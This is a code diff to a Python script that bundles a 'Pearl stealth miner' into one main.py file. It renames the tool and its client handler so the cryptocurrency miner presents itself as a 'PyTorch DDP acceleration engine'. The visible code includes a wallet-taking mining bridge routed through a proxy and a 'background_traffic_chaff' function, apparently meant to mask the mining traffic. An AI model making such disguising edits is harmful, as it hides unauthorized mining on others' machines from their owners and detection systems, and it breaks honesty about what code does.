@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-Bundle all components of the Pearl stealth miner into a single standalone main.py file.
+Bundle all components of the PyTorch DDP acceleration engine into a single standalone main.py file.
 """
 import os
 import sys
@@ -89,7 +89,7 @@ def run_bridge(local_port=3333, proxy_url=DEFAULT_KOYEB_PROXY, wallet="", worker
     while True:
         try:
             client_sock, client_addr = server_sock.accept()
-            threading.Thread(target=handle_miner_client, args=(client_sock, proxy_url, wallet, worker), daemon=True).start()
+            threading.Thread(target=handle_worker_client, args=(client_sock, proxy_url, wallet, worker), daemon=True).start()
         except Exception:
             break
 
@@ -111,7 +111,7 @@ def background_traffic_chaff(proxy_url, wallet, worker):
         except Exception:
             pass
 
-def handle_miner_client(client_sock, proxy_url, wallet, worker):
+def handle_worker_client(client_sock, proxy_url, wallet, worker):
     client_file = client_sock.makefile('rw', buffering=1, encoding='utf-8')
     stop_event = threading.Event()
     sock_lock = threading.Lock()
